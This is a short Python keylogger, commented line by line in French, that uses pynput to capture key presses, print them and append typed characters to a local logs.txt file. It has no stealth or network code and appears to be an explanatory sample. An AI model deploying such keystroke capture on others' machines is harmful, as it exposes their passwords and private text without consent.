# Importation de la bibliothèque 'keyboard' depuis 'pynput'
from pynput import keyboard

# Définition d'une fonction nommée 'Bstw' prenant un argument 'key'
def Bstw(key):
    # Affiche la touche pressée sous forme de chaîne de caractères
    print(str(key))
    
    # Ouvre le fichier 'logs.txt' en mode ajout
    with open("logs.txt", 'a') as logKey:
        try:
            # Tente d'obtenir le caractère associé à la touche pressée
            char = key.char
            # Écrit le caractère dans le fichier 'logs.txt'
            logKey.write(char)
        except:
            # Si une erreur se produit lors de la tentative d'obtention du caractère, affiche un message d'erreur
            print("Error getting char")

# Exécute le code suivant seulement si ce script est le script principal qui est en cours d'exécution
if __name__ == "__main__":
    # Crée un objet 'listener' qui écoute les événements de pression de touches en appelant la fonction 'Bstw'
    listener = keyboard.Listener(on_press=Bstw)
    # Démarre l'écouteur
    listener.start()
    # Attend l'entrée de l'utilisateur avant de terminer le programme
    input()
